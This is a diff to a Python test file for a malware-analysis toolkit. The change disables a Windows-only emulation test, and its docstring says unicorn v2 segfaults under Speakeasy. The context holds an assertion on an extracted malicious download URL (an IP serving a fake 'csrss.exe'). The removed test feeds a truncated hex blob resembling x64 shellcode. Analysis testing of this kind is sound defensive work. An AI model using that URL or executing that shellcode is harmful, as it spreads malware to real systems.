@@ -62,10 +62,10 @@ class TestVStack(TestUnitBase):
         unit = self.load_pipeline(r'officecrypt | xt oleObject1 | xt native | rex y:E9[] | vstack -b 0x8000 -a=x32 -w=80 0x8000 | xtp -ff')
         self.assertEqual(data | unit | str, 'htt''p:/''/103.153.79''.104/windows10/csrss.exe')
 
-    def test_speakeasy_on_windows(self):
-        import sys
-        if sys.platform != 'win32':
-            return
+    def disabled_test_speakeasy_on_windows(self):
+        """
+        This test fails as unicorn v2 segfaults when running this under Speakeasy.
+        """
         data = bytes.fromhex(
             'FC4883E4F0E8CC00000041514150524831D25165488B526056488B5218488B52204D31C9488B7250'
             '480FB74A4A4831C0AC3C617C022C2041C1C90D4101C1E2ED524151488B52208B423C4801D0668178'
